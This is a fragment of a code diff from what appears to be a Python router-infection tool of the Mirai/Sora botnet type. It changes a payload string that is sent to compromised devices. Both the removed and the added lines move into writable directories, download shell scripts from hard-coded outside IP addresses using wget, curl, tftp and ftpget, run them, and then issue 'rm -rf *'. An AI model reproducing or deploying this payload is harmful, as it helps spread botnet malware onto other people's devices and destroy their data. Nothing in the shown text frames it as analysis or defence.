@@ -52,7 +52,7 @@ class router(threading.Thread):
     def __init__ (self, ip):
         threading.Thread.__init__(self)
         self.ip = str(ip).rstrip('\n')
-        self.rekdevice=" cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://158.69.32.40/GoOgle.sh; chmod 777 GoOgle.sh; sh GoOgle.sh; tftp 158.69.32.40 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 158.69.32.40; chmod 777 tftp2.sh; sh tftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 158.69.32.40 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf GoOgle.sh tftp1.sh tftp2.sh ftp1.sh; rm -rf * " 
+        self.rekdevice=" cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://5.181.80.188/sora.sh; curl -O http://5.181.80.188/sora.sh; chmod 777 sora.sh; sh sora.sh; tftp 5.181.80.188 -c get sora.sh; chmod 777 sora.sh; sh sora.sh; tftp -r sora2.sh -g 5.181.80.188; chmod 777 sora2.sh; sh sora2.sh; ftpget -v -u anonymous -p anonymous -P 21 5.181.80.188 sora1.sh sora1.sh; sh sora1.sh; rm -rf sora.sh sora.sh sora2.sh sora1.sh; rm -rf * " 
     def run(self):
         global fh
         username = ""
